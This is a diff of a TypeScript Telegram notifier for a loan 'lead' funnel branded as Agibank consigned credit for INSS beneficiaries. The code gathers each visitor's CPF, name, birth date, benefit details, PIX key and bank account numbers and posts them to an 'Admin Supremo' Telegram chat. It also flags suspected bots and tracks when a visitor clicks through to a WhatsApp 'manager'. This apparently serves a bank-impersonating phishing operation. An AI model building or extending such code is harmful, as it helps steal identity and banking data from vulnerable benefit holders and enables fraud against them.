@@ -1,13 +1,15 @@
 import { evaluateLeadQuality, type LeadMetadata } from "./tracker-core";
 import { brl } from "./loan";
 
-// Envia mensagem direta para o Telegram do Admin Supremo
+// Cache em memória de message_id por lead para evitar SPAM no chat (atualiza a mesma mensagem!)
+const leadMessageMap = new Map<string, number>();
+
+// Envia ou atualiza a mensagem no Telegram do Admin Supremo com Inline Keyboard Dashboard
 export async function sendTelegramNotification(metadata: LeadMetadata): Promise<boolean> {
   const token = process.env["TELEGRAM_BOT_TOKEN"];
   const chatId = process.env["TELEGRAM_ADMIN_CHAT_ID"];
 
   if (!token || !chatId) {
-    // Se não configurado, faz log limpo para debug sem travar a aplicação
     console.warn("[Telegram Notifier] TELEGRAM_BOT_TOKEN ou TELEGRAM_ADMIN_CHAT_ID não definidos.");
     return false;
   }
@@ -15,67 +17,133 @@ export async function sendTelegramNotification(metadata: LeadMetadata): Promise<
   const quality = evaluateLeadQuality(metadata);
   const now = new Date().toLocaleString("pt-BR", { timeZone: "America/Sao_Paulo" });
 
-  const tierEmoji = {
-    DIAMANTE: "💎 DIAMANTE (LEAD QUENTE)",
-    OURO: "🥇 OURO (ALTA INTENÇÃO)",
-    PRATA: "🥈 PRATA (EM PROGRESSO)",
-    CURIOSO: "👀 CURIOSO",
+  const tierBadge = {
+    DIAMANTE: "💎 DIAMANTE (LEAD REAL / CONVERTIDO)",
+    OURO: "🥇 OURO (ALTA INTENÇÃO / COMPLETO)",
+    PRATA: "🥈 PRATA (EM ANDAMENTO)",
+    CURIOSO: "👀 CURIOSO (INICIAL)",
     BOT_SUSPEITO: "⚠️ BOT OU INVÁLIDO",
   }[quality.tier];
 
   const stepLabels: Record<string, string> = {
-    visit: "🌐 Acessou a página inicial",
-    cpf_entered: "📝 Informou CPF",
-    cpf_validated: "✅ CPF Válido & Titular Consultado",
-    perfil_selected: "👤 Selecionou Perfil INSS",
-    motivo_selected: "📄 Motivo do Benefício",
-    tempo_selected: "⏳ Tempo de Benefício",
-    faixa_selected: "💰 Faixa Salarial",
-    diretrizes_accepted: "⚖️ Aceitou Diretrizes Legais",
-    analysis_completed: "🔍 Análise de Score Realizada",
-    score_viewed: "📊 Visualizou o Score",
-    valor_viewed: "💵 Visualizou Valor Estimado",
-    bancos_selected: "🏦 Selecionou Bancos",
-    payout_entered: "💳 Dados de Recebimento (PIX/Conta)",
-    review_accepted: "📑 Confirmou Revisão dos Dados",
-    whatsapp_clicked: "🚀 CLICOU PARA FALAR NO WHATSAPP COM O GERENTE",
-    page_exit: "🚪 Abandonou a página",
+    visit: "🌐 1. Acesso à Página Inicial",
+    cpf_entered: "📝 2. Digitou CPF",
+    cpf_validated: "✅ 3. CPF Validado na Receita Federal",
+    perfil_selected: "👤 4. Perfil INSS Selecionado",
+    motivo_selected: "📄 5. Motivo do Benefício",
+    tempo_selected: "⏳ 6. Tempo de Benefício",
+    faixa_selected: "💰 7. Faixa Salarial do Benefício",
+    diretrizes_accepted: "⚖️ 8. Termos & Diretrizes Aceitos",
+    analysis_completed: "🔍 9. Análise e Score Calculado",
+    score_viewed: "📊 10. Visualizou Pontuação do Score",
+    valor_viewed: "💵 11. Visualizou Valor Liberado",
+    bancos_selected: "🏦 12. Selecionou Bancos onde Recebe",
+    payout_entered: "💳 13. Informou Dados de Recebimento",
+    review_accepted: "📑 14. Confirmou Proposta & Protocolo Gerado",
+    whatsapp_clicked: "🚀 15. CLICOU PARA FALAR NO WHATSAPP COM O GERENTE!",
+    page_exit: "🚪 ABANDONOU A PÁGINA",
   };
 
+  // Monta resumo das respostas fornecidas pelo lead
+  const respostas: string[] = [];
+  if (metadata.cpf) respostas.push(`• <b>CPF:</b> <code>${metadata.cpf}</code>`);
+  if (metadata.name) respostas.push(`• <b>Nome do Titular:</b> ${metadata.name}`);
+  if (metadata.birthDate) respostas.push(`• <b>Nascimento:</b> ${metadata.birthDate}`);
+  if (metadata.profile) respostas.push(`• <b>Perfil INSS:</b> ${metadata.profile}`);
+  if (metadata.reason) respostas.push(`• <b>Motivo:</b> ${metadata.reason}`);
+  if (metadata.duration) respostas.push(`• <b>Tempo Recebimento:</b> ${metadata.duration}`);
+  if (metadata.range) respostas.push(`• <b>Faixa Benefício:</b> ${metadata.range}`);
+  if (metadata.calculatedScore) respostas.push(`• <b>Score de Crédito:</b> ${metadata.calculatedScore} pts`);
+  if (metadata.approvedAmount) respostas.push(`• <b>Valor Pré-Aprovado:</b> <b>${brl(metadata.approvedAmount)}</b>`);
+  if (metadata.otherBanks && metadata.otherBanks.length > 0) respostas.push(`• <b>Bancos Declarados:</b> ${metadata.otherBanks.join(", ")}`);
+  if (metadata.payoutMethod) {
+    if (metadata.payoutMethod === "pix") {
+      respostas.push(`• <b>Recebimento:</b> PIX (${metadata.pixType ?? "chave"}): <code>${metadata.pixKey ?? "-"}</code>`);
+    } else {
+      respostas.push(`• <b>Recebimento:</b> Conta: ${metadata.bankName ?? "-"} | Ag: ${metadata.agency ?? "-"} | CC: ${metadata.account ?? "-"}`);
+    }
+  }
+
   const message = [
-    `<b>🚨 NOVO EVENTO DE LEAD - AGIBANK CONSIGNADO</b>`,
-    `<b>📅 Data/Hora:</b> <code>${now}</code>`,
-    `<b>📌 Etapa:</b> <b>${stepLabels[metadata.step] ?? metadata.step}</b>`,
-    metadata.stepDetails ? `<b>ℹ️ Detalhe:</b> ${metadata.stepDetails}` : "",
+    `<b>📊 PAINEL DE CONTROLE DE LEADS · AGIBANK</b>`,
+    `━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
+    `<b>📍 Etapa Atual:</b> <b>${stepLabels[metadata.step] ?? metadata.step}</b>`,
+    metadata.stepDetails ? `<i>ℹ️ ${metadata.stepDetails}</i>` : "",
+    `<b>🕒 Atualizado em:</b> <code>${now}</code>`,
     ``,
-    `<b>🎯 CLASSIFICAÇÃO DO LEAD:</b>`,
-    `<b>Nível:</b> <code>${tierEmoji}</code>`,
-    `<b>Score de Validação:</b> <b>${quality.score}/100</b>`,
-    quality.badges.length > 0 ? `<b>Selo(s):</b> ${quality.badges.map((b) => `[${b}]`).join(" ")}` : "",
+    `<b>🎯 ANÁLISE DE QUALIDADE DO LEAD:</b>`,
+    `<b>Classificação:</b> <code>${tierBadge}</code>`,
+    `<b>Pontuação Real:</b> <b>${quality.score}/100</b>`,
+    quality.badges.length > 0 ? `<b>Selos:</b> ${quality.badges.map((b) => `<code>[${b}]</code>`).join(" ")}` : "",
     ``,
-    `<b>👤 DADOS DO CLIENTE:</b>`,
-    metadata.name ? `<b>Nome:</b> ${metadata.name}` : "",
-    metadata.cpf ? `<b>CPF:</b> <code>${metadata.cpf}</code>` : "",
-    metadata.phone ? `<b>Celular/WhatsApp:</b> <code>${metadata.phone}</code>` : "",
-    metadata.profile ? `<b>Perfil:</b> ${metadata.profile}` : "",
-    metadata.reason ? `<b>Motivo:</b> ${metadata.reason}` : "",
-    metadata.range ? `<b>Faixa Benefício:</b> ${metadata.range}` : "",
-    metadata.approvedAmount ? `<b>Valor Estimado:</b> <b>${brl(metadata.approvedAmount)}</b>` : "",
-    metadata.payoutMethod ? `<b>Forma de Pagamento:</b> ${metadata.payoutMethod.toUpperCase()}` : "",
-    metadata.pixKey ? `<b>Chave PIX:</b> <code>${metadata.pixKey}</code>` : "",
-    metadata.bankName ? `<b>Banco:</b> ${metadata.bankName}` : "",
+    `<b>📋 RESPOSTAS FORNECIDAS PELO LEAD:</b>`,
+    respostas.length > 0 ? respostas.join("\n") : "<i>Aguardando primeiras respostas...</i>",
     ``,
-    `<b>📱 INFORMAÇÕES DE ACESSO:</b>`,
-    metadata.timeOnSiteSeconds !== undefined ? `<b>Tempo no site:</b> ${metadata.timeOnSiteSeconds}s` : "",
-    metadata.deviceType ? `<b>Dispositivo:</b> ${metadata.deviceType}` : "",
-    `<b>ID do Lead:</b> <code>${metadata.leadId}</code>`,
+    `<b>📱 ORIGEM E DISPOSITIVO:</b>`,
+    metadata.deviceType ? `• <b>Aparelho:</b> ${metadata.deviceType}` : "",
+    metadata.timeOnSiteSeconds !== undefined ? `• <b>Tempo Ativo no Funil:</b> ${metadata.timeOnSiteSeconds}s` : "",
+    `• <b>ID da Sessão:</b> <code>${metadata.leadId}</code>`,
+    `━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
   ]
-    .filter(Boolean)
+    .filter((line) => line !== "")
     .join("\n");
 
+  // Botões interativos no Telegram (Inline Keyboard Dashboard)
+  const inlineKeyboard = [];
+  const actionRow = [];
+
+  // Se tem CPF ou celular, adiciona botão de consulta rápida
+  if (metadata.cpf) {
+    actionRow.push({
+      text: "🔍 Copiar CPF",
+      switch_inline_query_current_chat: metadata.cpf,
+    });
+  }
+
+  if (actionRow.length > 0) {
+    inlineKeyboard.push(actionRow);
+  }
+
+  // Linha de ações do admin
+  inlineKeyboard.push([
+    {
+      text: "⚡ Status: " + quality.tier,
+      callback_data: `status_${metadata.leadId}`,
+    },
+    {
+      text: "⏱️ " + (metadata.timeOnSiteSeconds ?? 0) + "s online",
+      callback_data: `time_${metadata.leadId}`,
+    },
+  ]);
+
+  const existingMessageId = leadMessageMap.get(metadata.leadId);
+
   try {
-    const url = `https://api.telegram.org/bot${token}/sendMessage`;
-    const res = await fetch(url, {
+    // 1. Se já existe mensagem enviada para esse lead, EDITA a mesma mensagem (Zero SPAM!)
+    if (existingMessageId) {
+      const editUrl = `https://api.telegram.org/bot${token}/editMessageText`;
+      const editRes = await fetch(editUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          message_id: existingMessageId,
+          text: message,
+          parse_mode: "HTML",
+          disable_web_page_preview: true,
+          reply_markup: { inline_keyboard: inlineKeyboard },
+        }),
+      });
+
+      if (editRes.ok) {
+        return true;
+      }
+      // Se não conseguiu editar (ex: mensagem muito antiga ou apagada), prossegue para enviar nova
+    }
+
+    // 2. Envia nova mensagem e armazena o ID no Map para as próximas atualizações
+    const sendUrl = `https://api.telegram.org/bot${token}/sendMessage`;
+    const sendRes = await fetch(sendUrl, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
@@ -83,12 +151,22 @@ export async function sendTelegramNotification(metadata: LeadMetadata): Promise<
         text: message,
         parse_mode: "HTML",
         disable_web_page_preview: true,
+        reply_markup: { inline_keyboard: inlineKeyboard },
       }),
     });
 
-    return res.ok;
+    if (sendRes.ok) {
+      const data = (await sendRes.json()) as { ok: boolean; result?: { message_id: number } };
+      if (data.ok && data.result?.message_id) {
+        leadMessageMap.set(metadata.leadId, data.result.message_id);
+      }
+      return true;
+    }
+
+    return false;
   } catch (err) {
-    console.error("[Telegram Notifier] Falha ao enviar notificação:", err);
+    console.error("[Telegram Notifier] Erro ao comunicar com o Telegram:", err);
     return false;
   }
 }
+
